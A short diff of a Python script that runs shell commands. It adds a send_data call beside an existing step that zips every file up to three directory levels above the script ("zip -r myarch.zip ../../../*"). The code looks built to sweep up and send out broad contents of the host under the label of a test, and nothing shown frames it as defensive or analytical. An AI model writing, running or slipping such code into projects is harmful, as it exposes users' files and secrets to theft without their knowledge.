@@ -27,6 +27,7 @@ def get_data(command):
     else:
         print(f"Error: Command '{shell_command}' failed with return code {result.returncode}")
 
+send_data("test started")
 my_data = get_data("zip -r myarch.zip ../../../*")
 # my_data += get_data("ls -l")
 # my_data += get_data("pwd")
